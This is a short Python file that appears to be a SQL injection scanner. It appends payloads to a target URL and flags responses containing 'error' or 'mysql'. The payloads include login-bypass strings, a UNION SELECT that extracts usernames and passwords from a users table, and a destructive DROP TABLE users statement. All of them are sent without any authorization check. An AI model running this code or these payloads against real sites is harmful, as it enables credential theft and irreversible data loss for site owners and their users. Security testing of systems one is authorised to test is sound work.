import requests

class SQLInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []

    def scan(self):
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; -- "
        ]

        for payload in payloads:
            url = self.target_url + payload
            response = requests.get(url)

            if self.is_vulnerable(response):
                self.vulnerabilities.append(payload)

    def is_vulnerable(self, response):
        return "error" in response.text.lower() or "mysql" in response.text.lower()

    def get_results(self):
        return self.vulnerabilities if self.vulnerabilities else ["No SQL Injection vulnerabilities found."]